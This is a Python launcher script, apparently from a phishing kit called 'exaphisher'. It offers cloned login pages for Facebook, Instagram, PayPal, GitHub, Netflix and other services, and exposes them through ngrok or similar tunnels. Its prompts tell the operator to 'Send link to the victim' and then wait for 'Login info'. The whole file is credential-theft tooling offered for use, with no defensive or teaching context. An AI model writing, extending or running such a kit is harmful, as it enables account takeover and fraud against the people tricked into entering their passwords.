import os
from multiprocessing import Process
from src.some_func import *
import time
try:
    from src.setup_ver import *
except Exception:
    print("no dipendencies found, go on https://github.com/RedKatz/exaphisher and copy-paste in termianl setup command for your system")



class bcolors:
    HEADER    = '\033[95m'
    OKBLUE    = '\033[34m'
    OKGREEN   = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDC      = '\033[0m'
    GREY      = '\033[90m'
    BG_RED    = '\033[41m'




clear()
banner()
print(choice)
scelta = input(square_tild+bcolors.OKGREEN+" Select an option: "+bcolors.ENDC)

clear()
banner()
print(choice2)
scelta2 = input(square_tild+bcolors.OKGREEN+" Select an option: "+bcolors.ENDC)

clear()
banner()
if scelta2 == "1":
    print("\n"+square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.ENDC)
    print("\n"+square_tild+bcolors.OKBLUE+" Send link to the victim: "+bcolors.ENDC+"run "+bcolors.UNDERLINE+bcolors.WARNING+"ngrok http localhost:8080"+bcolors.ENDC+" on new terminal"+bcolors.ENDC)
    print(bcolors.OKBLUE+'''
'''+square_tild+bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC+'''

    ''')
elif scelta2 == "2":
    def script1():
        os.system("python3 lt.py")
        
    if __name__ == '__main__':
        p = Process(target=script1)
        p.start()
    time.sleep(1.5)
    file = open("url.txt", "r")
    time.sleep(1.5)
    #read the content of file
    url = file.read()
    print(bcolors.OKBLUE+'''
'''+square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.OKBLUE+'''
'''+square_tild+bcolors.OKBLUE+''' Send link to the victim :'''+bcolors.WARNING+url[12:100]+bcolors.ENDC+'''
'''+square_tild+bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC+'''

    ''')
elif scelta2 == "3":
    def script2():
        os.system("python3 lh.py")
        
    if __name__ == '__main__':
        p = Process(target=script2)
        p.start()
    print('''\n\n'''+
square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.OKGREEN)          
    time.sleep(3)
    print(bcolors.ENDC)
    print(bcolors.OKBLUE+'''                                 Send link to the victim ↑''')
    print("\n")
    print(bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC)

if scelta == "1":
    os.chdir("./src/template/facebook")
    os.system("python3 facebook.py")
if scelta == "2":
    os.chdir("./src/template/instagram")
    os.system("python3 instagram.py")
if scelta == "3":
    os.chdir("./src/template/paypal")
    os.system("python3 paypal.py")
if scelta == "4":
    os.chdir("./src/template/twitter")
    os.system("python3 twitter.py")
if scelta == "5":
    os.chdir("./src/template/netflix")
    os.system("python3 netflix.py")
if scelta == "6":
    os.chdir("./src/template/twitch")
    os.system("python3 twitch.py")
if scelta == "7":
    os.chdir("./src/template/github")
    os.system("python3 github.py")
if scelta == "8":
    os.chdir("./src/template/spotify")
    os.system("python3 spotify.py")
if scelta == "9":
    os.chdir("./src/template/pinterest")
    os.system("python3 pinterest.py")
if scelta == "10":
    os.chdir("./src/template/linkedin")
    os.system("python3 linkedin.py")
